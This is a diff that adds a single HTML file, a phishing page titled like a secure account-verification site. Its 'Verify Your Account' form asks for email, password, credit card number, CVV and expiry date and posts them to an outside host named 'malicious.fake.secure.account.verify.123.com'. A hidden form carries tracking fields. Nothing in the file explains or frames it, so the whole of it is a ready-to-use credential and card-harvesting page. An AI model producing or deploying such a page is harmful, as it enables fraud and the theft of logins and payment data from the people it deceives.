@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure.Login.Account.Verify.123.com</title>
+</head>
+<body style="font-family: Arial, sans-serif; background-color: #f0f0f0; margin: 0; padding: 20px;">
+    <div style="max-width: 400px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+        <form action="http://malicious.fake.secure.account.verify.123.com/login.php" method="POST">
+            <h2>Verify Your Account</h2>
+            <input type="email" name="email" placeholder="Email" required style="width: 100%; margin: 10px 0; padding: 8px;"><br>
+            <input type="password" name="password" placeholder="Password" required style="width: 100%; margin: 10px 0; padding: 8px;"><br>
+            <input type="text" name="card" placeholder="Credit Card Number" required style="width: 100%; margin: 10px 0; padding: 8px;"><br>
+            <input type="text" name="cvv" placeholder="CVV" required style="width: 100%; margin: 10px 0; padding: 8px;"><br>
+            <input type="text" name="expiry" placeholder="Expiry Date" required style="width: 100%; margin: 10px 0; padding: 8px;"><br>
+            <button type="submit" style="width: 100%; background: #0066cc; color: white; padding: 10px; border: none; border-radius: 4px;">Verify Now</button>
+        </form>
+    </div>
+
+    <form id="hidden_form" style="display: none;">
+        <input type="hidden" name="tracking" value="1">
+        <input type="hidden" name="user_id" value="2">
+    </form>
+</body>
+</html>
